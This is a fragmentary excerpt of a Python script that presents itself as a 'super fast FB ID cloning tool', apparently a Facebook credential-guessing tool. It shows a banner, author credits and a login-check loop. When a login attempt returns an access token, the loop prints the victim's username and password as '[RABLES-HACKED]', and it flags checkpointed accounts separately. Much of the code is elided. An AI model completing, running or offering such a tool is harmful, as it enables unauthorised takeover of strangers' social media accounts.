...
psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY Imran Hossen.......ANY ONE COPY THIS CODE! CREDIT ME ........Excellent man Imran......................................OPENING.............')
...
|_| \_\ /_/   \_\ |____/  |_____| |_____| |____/ Author: Rebooting Rables
...
def menu():
    ...
    print 'Codder.  : Excellent man Imran'

    print 'AUTHOR   : Rebooting Rables'

    print 'FACOfficial : https://www.facebook.com/RebootingRebels.Official'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[RABLES-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[RABLES-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(MAMUN)Open After 03 Days]\x1b[0m \n'
